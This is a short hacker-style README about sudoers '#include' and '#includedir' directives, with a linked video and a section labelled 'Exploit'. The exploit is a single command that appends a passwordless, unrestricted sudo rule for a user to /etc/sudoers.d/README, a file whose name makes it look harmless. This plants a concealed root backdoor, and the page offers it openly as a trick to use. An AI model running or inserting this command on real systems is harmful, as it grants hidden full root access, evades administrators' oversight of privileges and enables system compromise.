Advantage of "#include" and README file in sudoers architecture!
======================

"*...It is possible to include other sudoers files from within the sudoers file currently being parsed using the #include and #includedir directives...*"

**Video**

<a href="http://www.youtube.com/watch?feature=player_embedded&v=tkwEn7q0Cc0" target="_blank"><img src="http://img.youtube.com/vi/tkwEn7q0Cc0/0.jpg" alt='Pound sign "trick" with #includedir sudoers file' width="480" height="360" border="10" /></a>

**Exploit**
```shell-session

sudo su -c "echo '<user> ALL = NOPASSWD: ALL' >> /etc/sudoers.d/README"

```

Keep your eyes open, sometimes pound sign does not mean comment! Hack the Planet!

